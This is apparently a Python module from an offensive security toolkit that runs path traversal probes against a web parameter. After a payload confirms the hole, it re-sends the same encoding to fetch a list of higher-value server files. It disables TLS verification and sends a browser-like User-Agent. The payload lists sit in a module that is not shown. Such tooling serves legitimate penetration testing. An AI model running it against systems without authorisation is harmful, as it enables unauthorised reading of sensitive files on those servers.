"""
Network execution for path_traversal_probe: tests a parameter with bounded,
stack-agnostic traversal payloads, then -- once one confirms -- replays
that exact confirmed encoding style and traversal depth against a second,
fixed, bounded list of higher-value files (see parse.py's
build_followup_payloads). The follow-up step reuses the same single-GET,
read-only mechanism already proven by the confirmation itself: no new
privilege, no write, same risk tier. No parsing logic here -- see parse.py.
"""
from __future__ import annotations

from typing import Optional

import requests
import urllib3

from tradecraft.adapters.path_traversal_probe import parse as trav_parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MAX_BODY_CHARS = trav_parse.DEFAULT_MAX_BODY_CHARS


def _probe_one(
    session: requests.Session,
    target_url: str,
    parameter: str,
    payload: str,
    file_description: str,
    signature: str,
    timeout: int,
) -> trav_parse.RawTraversalProbe:
    probe_url = trav_parse.build_probe_url(target_url, parameter, payload)
    try:
        resp = session.get(
            probe_url,
            timeout=timeout,
            verify=False,
            allow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) tradecraft/1.0"},
        )
        body = resp.text[:MAX_BODY_CHARS]
        return trav_parse.RawTraversalProbe(
            payload=payload,
            file_description=file_description,
            status_code=resp.status_code,
            url=resp.url,
            body=body,
            confirmed=trav_parse.check_traversal_response(body, signature),
        )
    except requests.RequestException as e:
        return trav_parse.RawTraversalProbe(
            payload=payload,
            file_description=file_description,
            url=probe_url,
            error=str(e),
        )


def execute(
    target: str,
    parameter: str,
    timeout: int = 15,
    session: Optional[requests.Session] = None,
) -> trav_parse.RawTraversalResult:
    target_url = trav_parse.normalize_target_url(target)
    if not target_url:
        return trav_parse.RawTraversalResult(error="empty target URL")
    if not parameter:
        return trav_parse.RawTraversalResult(target=target_url, error="missing required parameter")

    payloads = trav_parse.build_traversal_payloads()
    close_session = False
    if session is None:
        session = requests.Session()
        close_session = True

    result = trav_parse.RawTraversalResult(target=target_url, parameter=parameter)

    try:
        for payload, desc, signature, style, depth in payloads:
            probe = _probe_one(session, target_url, parameter, payload, desc, signature, timeout)
            result.probes.append(probe)
            result.tested_count += 1
            if probe.confirmed:
                result.confirmed_style, result.confirmed_depth = style, depth
                break

        if result.confirmed_style is not None:
            followups = trav_parse.build_followup_payloads(result.confirmed_style, result.confirmed_depth)
            for payload, desc, signature in followups:
                probe = _probe_one(session, target_url, parameter, payload, desc, signature, timeout)
                result.followup_probes.append(probe)
    finally:
        if close_session:
            session.close()

    return result
